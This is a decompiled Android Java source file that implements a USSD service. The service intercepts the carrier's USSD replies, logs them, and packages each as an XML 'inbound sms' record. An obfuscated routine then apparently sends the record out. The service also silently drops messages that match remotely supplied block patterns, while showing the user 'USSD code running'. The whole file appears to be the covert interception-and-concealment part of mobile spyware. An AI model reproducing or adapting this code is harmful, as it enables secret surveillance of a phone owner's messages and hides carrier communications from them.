package com.network.ussd;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Xml;
import com.android.internal.telephony.IExtendedNetworkService;
import com.network.android.SmsReceiver;
import com.network.android.c.a.a;
import com.network.android.j;
import com.network.android.m;
import com.network.b.b;
import java.io.StringWriter;
import java.util.Date;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.xmlpull.v1.XmlSerializer;

public class CDUSSDService extends Service {
    private static Handler resendingHandler;
    private boolean mActive = false;
    private final IExtendedNetworkService.Stub mBinder = new IExtendedNetworkService.Stub() {
        /* class com.network.ussd.CDUSSDService.AnonymousClass2 */
        private String b = "Non";

        static /* synthetic */ void a(AnonymousClass2 r7, CharSequence charSequence) {
            try {
                a.a("CDUSSDService get user message: " + ((Object) charSequence));
                XmlSerializer newSerializer = Xml.newSerializer();
                StringWriter stringWriter = new StringWriter();
                CDUSSDService cDUSSDService = CDUSSDService.this;
                SmsReceiver.a(newSerializer, stringWriter);
                newSerializer.startTag("", "sms");
                m.a(newSerializer, "inbound", r7.b, charSequence.toString(), String.valueOf(new Date().getTime()), "ussd");
                newSerializer.endTag("", "sms");
                SmsReceiver.a(newSerializer);
                j.a(CDUSSDService.this, stringWriter.toString(), (String[]) null, (byte[][]) null);
            } catch (Throwable th) {
                a.a("CDUSSDService exception: " + th.getMessage(), th);
            }
        }

        private void a(CharSequence charSequence) {
            CDUSSDService.resendingHandler.post(new b(this, charSequence));
        }

        @Override // com.android.internal.telephony.IExtendedNetworkService
        public void clearMmiString() {
            a.a("CDUSSDService mBinder called clear!");
        }

        @Override // com.android.internal.telephony.IExtendedNetworkService
        public CharSequence getMmiRunningText() {
            return "USSD code running";
        }

        @Override // com.android.internal.telephony.IExtendedNetworkService
        public CharSequence getUserMessage(CharSequence charSequence) {
            try {
                if (CDUSSDService.this.shouldblock(charSequence)) {
                    a("[BLOCKED]" + ((Object) charSequence));
                    return null;
                }
                a(charSequence);
                return charSequence;
            } catch (Exception e) {
                a.a("CDUSSDService getUserMessage exception: " + e.getMessage(), e);
                return charSequence;
            }
        }

        @Override // com.android.internal.telephony.IExtendedNetworkService
        public void setMmiString(String str) {
            a.a("CDUSSDService mBinder setMmiString:" + str);
            this.b = str;
        }
    };
    BroadcastReceiver receiver = new a(this);

    static {
        HandlerThread handlerThread = new HandlerThread("CDUSSDService");
        handlerThread.start();
        resendingHandler = new Handler(handlerThread.getLooper());
    }

    /* access modifiers changed from: private */
    /* access modifiers changed from: public */
    private boolean shouldblock(CharSequence charSequence) {
        boolean z;
        boolean z2 = false;
        try {
            a.a("CDUSSDService shouldblock");
            List f = b.f(this);
            if (f == null || f.size() == 0) {
                a.a("CDUSSDService shouldblock have no pattenrs to block");
                return z2;
            }
            int i = 0;
            while (i < f.size()) {
                Pattern pattern = (Pattern) f.get(i);
                try {
                    Matcher matcher = pattern.matcher(charSequence);
                    a.a("CDUSSDService shouldblock maching pattern" + pattern.pattern());
                    if (matcher.matches()) {
                        z = true;
                        i++;
                        z2 = z;
                    }
                } catch (Throwable th) {
                    a.a("CDUSSDService shouldblock" + i + " exception- " + th.getMessage(), th);
                }
                z = z2;
                i++;
                z2 = z;
            }
            a.a("CDUSSDService shouldblock return: " + z2);
            return z2;
        } catch (Throwable th2) {
            a.a("CDUSSDService shouldblock exception: " + th2.getMessage(), th2);
        }
    }

    public IBinder onBind(Intent intent) {
        a.a("CDUSSDService called onbind");
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("android.intent.action.INSERT");
        intentFilter.addAction("android.intent.action.DELETE");
        intentFilter.addDataScheme("ussd");
        intentFilter.addDataAuthority("cd", null);
        intentFilter.addDataPath("/", 0);
        registerReceiver(this.receiver, intentFilter);
        return this.mBinder;
    }
}
